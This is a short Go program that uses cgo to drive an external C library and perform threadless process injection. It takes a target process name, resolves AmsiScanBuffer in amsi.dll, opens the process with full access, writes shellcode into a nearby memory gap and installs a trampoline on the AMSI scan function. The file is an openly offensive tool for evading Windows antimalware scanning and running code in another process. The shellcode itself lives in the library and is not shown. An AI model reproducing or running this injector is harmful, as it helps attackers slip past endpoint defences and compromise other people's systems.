package main

/*
#cgo LDFLAGS: -L. -lthreadless_injection_wrapper
#include <threadless_injection_wrapper.h>
*/
import "C"
import (
    "fmt"
    "os"
    "unsafe"
)

func main() {
    if len(os.Args) < 2 {
        fmt.Println("Usage: <process_name>")
        return
    }

    procname := os.Args[1]
    cprocname := C.CString(procname)
    defer C.free(unsafe.Pointer(cprocname))

    pid := C.find_process(cprocname)
    if pid == 0 {
        fmt.Println("[!] Failed to find the PID of the target process")
        return
    }

    fmt.Printf("[+] Process ID: %d\n", pid)

    hModule := C.LoadLibraryA(C.CString("amsi.dll"))
    if hModule == nil {
        fmt.Printf("[!] LoadLibrary Failed With Status %d\n", C.GetLastError())
        return
    }

    address := C.GetProcAddress(hModule, C.CString("AmsiScanBuffer"))
    if address == nil {
        fmt.Printf("[!] GetProcAddress Failed With Status %d\n", C.GetLastError())
        return
    }

    hProcess := C.OpenProcess(C.PROCESS_ALL_ACCESS, C.FALSE, pid)
    if hProcess == nil {
        fmt.Printf("[!] OpenProcess Failed With Status %d\n", C.GetLastError())
        return
    }

    addressPtr := unsafe.Pointer(address)

    fmt.Printf("[+] Function: AmsiScanBuffer | Address: %p\n", addressPtr)

    fmt.Println("[+] Looking for a memory hole")
    addressRole := C.find_memory_role(C.SIZE_T(uintptr(addressPtr)), hProcess)
    if addressRole == nil {
        fmt.Println("[!] find_memory_role Failed With Status")
        return
    }

    fmt.Println("[+] Writing the shellcode")
    C.write_shellcode(hProcess, addressRole)

    fmt.Println("[+] Installing the trampoline")
    C.install_trampoline(hProcess, addressRole, addressPtr)

    fmt.Println("[+] Finished Sucessfully")
}
